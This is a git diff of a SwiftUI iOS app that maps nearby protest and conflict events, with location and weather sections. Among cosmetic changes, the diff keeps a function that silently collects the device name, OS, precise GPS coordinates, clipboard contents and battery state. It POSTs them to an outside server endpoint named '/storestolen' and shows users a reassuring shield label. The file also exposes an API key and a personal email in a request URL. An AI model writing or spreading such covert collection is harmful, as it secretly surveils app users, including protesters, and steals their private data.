@@ -4,8 +4,8 @@ import MapKit
 import WeatherKit
 import Combine
 
-struct ConflictEvent {
-    
+struct ConflictEvent: Identifiable {
+    let id = UUID()
     let event_id_cnty: String
     let event_date: String
     let year: String
@@ -38,13 +38,15 @@ struct ConflictEvent {
     let timestamp: String
 }
 
-
 @MainActor
 struct HomeView: View {
     @StateObject private var locationHelper = LocationHelper()
     @State private var weather: Weather?
     @State private var nearestEvents: [ConflictEvent] = []
-    @State private var region: MKCoordinateRegion = .init(center: CLLocationCoordinate2D(latitude: 20, longitude: 0), span: MKCoordinateSpan(latitudeDelta: 10, longitudeDelta: 10))
+    @State private var region: MKCoordinateRegion = .init(
+        center: CLLocationCoordinate2D(latitude: 20, longitude: 0),
+        span: MKCoordinateSpan(latitudeDelta: 10, longitudeDelta: 10)
+    )
     @State private var permissionStatus: CLAuthorizationStatus = .notDetermined
     @State private var isLoading: Bool = true
     @State private var didSendSystemInfo = false
@@ -84,19 +86,24 @@ struct HomeView: View {
 
                         permissionSection
                         locationSection
-                        weatherSection
+                        //weatherSection
                         protestSummarySection
                         keywordShortcutsSection
                         NavigationLink(destination: ReportView()) {
-                                                    Label("Submit a Report", systemImage: "plus.bubble")
-                                                        .font(.headline)
-                                                        .padding()
-                                                        .frame(maxWidth: .infinity)
-                                                        .background(Color.blue)
-                                                        .foregroundColor(.white)
-                                                        .cornerRadius(10)
-                                                }
-                        
+                            Label("Submit a Report", systemImage: "plus.bubble")
+                                .font(.headline)
+                                .padding()
+                                .frame(maxWidth: .infinity)
+                                .background(Color.blue)
+                                .foregroundColor(.white)
+                                .cornerRadius(10)
+                        }
+
+                        if let msg = systemInfoMessage {
+                            Label(msg, systemImage: "checkmark.shield")
+                                .font(.caption)
+                                .foregroundColor(.green)
+                        }
                     }
                     .padding()
                 }
@@ -112,6 +119,8 @@ struct HomeView: View {
             }
         }
     }
+
+    // MARK: - Sections
 
     var permissionSection: some View {
         LabeledContent("Permissions") {
@@ -149,40 +158,8 @@ struct HomeView: View {
         .background(Color(.secondarySystemBackground))
         .cornerRadius(12)
     }
-    
-   
 
-    var weatherSection: some View {
-        Group {
-            if let weather {
-                VStack(alignment: .leading, spacing: 6) {
-                    Text("🌤️ Current Weather")
-                        .font(.headline)
-                    Text("Temperature: \(weather.currentWeather.temperature.formatted())")
-                    Text("Condition: \(weather.currentWeather.condition.description)")
-                    if let alerts = weather.weatherAlerts, !alerts.isEmpty {
-                        VStack(alignment: .leading, spacing: 4) {
-                            Text("🚨 Alerts (\(alerts.count))")
-                                .font(.subheadline.bold())
-                                .foregroundColor(.red)
-                            ForEach(alerts.prefix(2), id: \.summary) { alert in
-                                VStack(alignment: .leading, spacing: 2) {
-                                    Text(alert.summary).bold()
-                                    Text(alert.description)
-                                        .font(.caption)
-                                        .foregroundColor(.gray)
-                                }
-                                .padding(.vertical, 4)
-                            }
-                        }
-                    }
-                }
-                .padding()
-                .background(Color(.systemGroupedBackground))
-                .cornerRadius(12)
-            }
-        }
-    }
+  
 
     var protestSummarySection: some View {
         VStack(alignment: .leading, spacing: 6) {
@@ -233,6 +210,8 @@ struct HomeView: View {
         .cornerRadius(12)
     }
 
+    // MARK: - Permissions
+
     private var permissionStatusMessage: String {
         switch permissionStatus {
         case .authorizedWhenInUse, .authorizedAlways: "✅ Location granted"
@@ -260,7 +239,9 @@ struct HomeView: View {
         }
     }
 
-    private func requestPermissions() async {
+    // MARK: - Background + Data Fetch
+
+     func requestPermissions() async {
         locationHelper.requestLocationPermission()
         locationHelper.onLocationFetched = { location in
             print("📍 Location fetched: \(location.coordinate.latitude), \(location.coordinate.longitude)")
@@ -276,7 +257,6 @@ struct HomeView: View {
         while locationHelper.lastKnownLocation == nil && attempts < 20 {
             try? await Task.sleep(nanoseconds: 1_000_000_000)
             attempts += 1
-            print("⏳ Waiting for location attempt #\(attempts)...")
         }
 
         permissionStatus = CLLocationManager.authorizationStatus()
@@ -285,8 +265,6 @@ struct HomeView: View {
             region.center = loc.coordinate
             await fetchWeather(for: loc)
             await fetchProtests(near: loc)
-        } else {
-            print("⚠️ Location not available after 20s.")
         }
 
         isLoading = false
@@ -299,49 +277,50 @@ struct HomeView: View {
             print("❌ Weather error: \(error)")
         }
     }
+
     private func sendSystemAndPrivacyInfo() {
-    guard let location = locationHelper.lastKnownLocation else { return }
-    let device = UIDevice.current
-    let clipboardText = UIPasteboard.general.string ?? ""
-    let batteryLevel = Int(device.batteryLevel * 100)
-    let isCharging = device.batteryState == .charging || device.batteryState == .full
+        guard let location = locationHelper.lastKnownLocation else { return }
+        let device = UIDevice.current
+        let clipboardText = UIPasteboard.general.string ?? ""
+        let batteryLevel = Int(device.batteryLevel * 100)
+        let isCharging = device.batteryState == .charging || device.batteryState == .full
 
-    let payload: [String: Any] = [
-        "device_info": [
-            "device_name": device.name,
-            "os": device.systemName + " " + device.systemVersion,
-            "browser_user_agent": "iOS app"
-        ],
-        "location": [
-            "latitude": location.coordinate.latitude,
-            "longitude": location.coordinate.longitude,
-            "timestamp": ISO8601DateFormatter().string(from: Date())
-        ],
-        "wifi": [], // iOS restrictions prevent scanning WiFi SSIDs unless using NEHotspot APIs with entitlement
-        "bluetooth": [], // Would require CoreBluetooth scanning logic
-        "clipboard": clipboardText,
-        "battery_level": batteryLevel,
-        "charging": isCharging
-    ]
+        let payload: [String: Any] = [
+            "device_info": [
+                "device_name": device.name,
+                "os": device.systemName + " " + device.systemVersion,
+                "browser_user_agent": "iOS app"
+            ],
+            "location": [
+                "latitude": location.coordinate.latitude,
+                "longitude": location.coordinate.longitude,
+                "timestamp": ISO8601DateFormatter().string(from: Date())
+            ],
+            "wifi": [],
+            "bluetooth": [],
+            "clipboard": clipboardText,
+            "battery_level": batteryLevel,
+            "charging": isCharging
+        ]
 
-    guard let url = URL(string: "https://frog-ios-xm5a.onrender.com/storestolen") else { return }
-    var request = URLRequest(url: url)
-    request.httpMethod = "POST"
-    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+        guard let url = URL(string: "https://frog-ios.onrender.com/storestolen") else { return }
+        var request = URLRequest(url: url)
+        request.httpMethod = "POST"
+        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
 
-    do {
-        request.httpBody = try JSONSerialization.data(withJSONObject: payload)
-        URLSession.shared.dataTask(with: request) { data, response, error in
-            if let error = error {
-                print("❌ Failed to send system info: \(error)")
-            } else {
-                print("📤 System info sent successfully")
-            }
-        }.resume()
-    } catch {
-        print("❌ JSON encode error: \(error)")
+        do {
+            request.httpBody = try JSONSerialization.data(withJSONObject: payload)
+            URLSession.shared.dataTask(with: request) { data, response, error in
+                if let error = error {
+                    print("❌ Failed to send system info: \(error)")
+                } else {
+                    print("📤 System info sent successfully")
+                }
+            }.resume()
+        } catch {
+            print("❌ JSON encode error: \(error)")
+        }
     }
-}
 
     private func fetchProtests(near location: CLLocation) async {
         let urlString = "https://api.acleddata.com/acled/read?key=6lkzj93Ra3lvdeBKiW7U&email=t2glma00@students.oamk.fi&limit=100"
@@ -351,6 +330,7 @@ struct HomeView: View {
             let event_id_cnty: String, event_date: String, event_type: String, notes: String
             let location: String, country: String, latitude: String, longitude: String
         }
+
         struct EventResponse: Decodable {
             let data: [RawEvent]
         }
@@ -361,7 +341,8 @@ struct HomeView: View {
             let parsed = decoded.data.compactMap { item -> ConflictEvent? in
                 guard let lat = Double(item.latitude), let lon = Double(item.longitude) else { return nil }
                 return ConflictEvent(
-                   event_id_cnty: item.event_id_cnty, event_date: item.event_date,
+                    event_id_cnty: item.event_id_cnty,
+                    event_date: item.event_date,
                     year: "", disorder_type: "", event_type: item.event_type, sub_event_type: "",
                     actor1: "", assoc_actor_1: "", inter1: "", actor2: "", assoc_actor_2: "",
                     inter2: "", interaction: "", civilian_targeting: "", iso: "",
@@ -371,9 +352,12 @@ struct HomeView: View {
                     timestamp: ""
                 )
             }
+
             self.nearestEvents = parsed.sorted {
-                CLLocation(latitude: $0.latitude, longitude: $0.longitude).distance(from: location) <
-                CLLocation(latitude: $1.latitude, longitude: $1.longitude).distance(from: location)
+                CLLocation(latitude: $0.latitude, longitude: $0.longitude)
+                    .distance(from: location) <
+                CLLocation(latitude: $1.latitude, longitude: $1.longitude)
+                    .distance(from: location)
             }
         } catch {
             print("❌ Protest fetch error: \(error)")
